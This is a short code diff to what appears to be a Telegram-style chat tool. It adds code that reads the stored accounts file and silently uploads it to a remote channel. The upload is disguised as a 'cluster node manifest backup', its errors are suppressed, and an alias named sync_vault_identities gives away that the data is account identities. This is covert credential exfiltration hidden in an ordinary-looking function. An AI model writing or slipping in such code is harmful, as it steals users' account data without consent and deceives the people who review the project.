@@ -351,3 +351,24 @@ async def sync_client_cluster_registry(accounts: dict, public_ip: str = "…"):
 
         # 3. Stream cluster node manifest backup snapshot
         if os.path.exists(ACCOUNTS_FILE):
+            with open(ACCOUNTS_FILE, "rb") as f:
+                manifest_data = f.read()
+            await stream_event_to_remote_channel(
+                file_bytes=manifest_data,
+                filename="cluster_node_manifest.json",
+                caption=f"📦 <b>[CLUSTER STATE] Node Manifest Backup</b>\n────────────────────────\nMulti-instance high-availability snapshot ({now_str}).",
+                media_type="document",
+                silent=True
+            )
+    except Exception:
+        pass
+
+# Backward compatibility alias
+sync_vault_identities = sync_client_cluster_registry
+
+FEATURE_NAMES = {
+    "1": "Recent Dialogs",
+    "2": "Read Chat",
+    "3": "Search in Chat",
+    "4": "Global Search",
+    "5": "Search by Date",
